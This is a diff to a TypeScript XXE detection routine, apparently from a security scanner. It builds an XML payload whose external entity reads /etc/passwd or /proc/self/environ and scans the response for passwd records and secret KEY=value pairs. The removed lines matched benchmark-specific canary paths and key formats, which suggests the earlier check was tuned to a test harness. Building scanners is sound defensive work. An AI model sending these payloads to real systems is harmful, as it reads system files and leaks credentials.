@@ -114,15 +114,17 @@ export async function diffXxeCanary(
   }
 
   const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
-  // In-band fallback: resolve a virtual-filesystem entity and look for the resolved content in the
+  // In-band fallback: resolve a standard OS entity and look for the resolved content in the
   // response. Only a real resolution can surface these markers, so hardened parsers stay silent.
   const inband: Array<Record<string, unknown>> = []
   let inbandHit = false
-  const resolvedMarkers = /root:x:0:0:|API_KEY=rbs_[a-z0-9]+_[0-9a-f]{12}|SESSION_SECRET=/
+  // Generic content signatures: a passwd record or an environment/key=value assignment surfaced by
+  // resolving a standard local file. No benchmark/harness canary grammar is consulted.
+  const resolvedMarkers = /root:x:0:0:|(?:^|[\s;&"'[\]])(?:[A-Z][A-Z0-9_]{2,})=(?:[^\s"'<>]{4,})/m
   const inbandBody = (entity: string) =>
     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${entity}">]><root><project/><note>&gx;</note><issuer>kovo-issuer</issuer></root>`
-  for (const entity of ['file:///etc/passwd', 'file:///app/config/secrets.env']) {
-    const ctrl = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody('file:///app/.env'), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
+  for (const entity of ['file:///etc/passwd', 'file:///proc/self/environ']) {
+    const ctrl = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody('file:///etc/hostname'), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
     const probe = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody(entity), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
     if (!ctrl || !probe) continue
     const marker = resolvedMarkers.test(probe.body)
